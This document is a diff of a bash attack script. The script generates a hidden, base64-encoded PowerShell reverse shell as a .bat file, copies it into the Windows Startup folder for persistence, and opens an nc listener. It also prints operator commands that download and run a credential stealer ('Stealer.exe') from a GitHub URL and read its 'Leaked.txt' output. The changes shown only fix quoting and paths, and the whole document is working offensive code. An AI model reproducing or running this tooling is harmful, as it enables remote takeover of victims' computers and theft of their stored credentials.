@@ -27,9 +27,9 @@ then
 read -p $'\e\n[1;93mEnter The Port: \e[0m' port
 echo""
 printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe\e[0m'''
+printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe"\e[0m'''
 printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
-printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n\n"
 nc -klvp $port
 sleep 1
 
@@ -47,7 +47,7 @@ printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[
 sleep 1
 echo -e "@echo off" >> $ps_tcp.bat 
 echo -e "cd %temp%" >> $ps_tcp.bat
-echo -e '''copy %0 "%appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
+echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
 echo -n "powershell -executionpolicy bypass -windowstyle hidden -noexit -nologo -e " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
 rm -rf powershell_reverse_tcp.txt
 sleep 1
@@ -58,9 +58,9 @@ read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
 	if [[ $Option == Y || $Option == y ]]
 	then
 	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-	printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe\e[0m'''
+	printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe"\e[0m'''
 	printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
-	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n\n"
 	nc -klvp $port
 	sleep 1
 	elif [[ $Option == N || $Option == n ]]
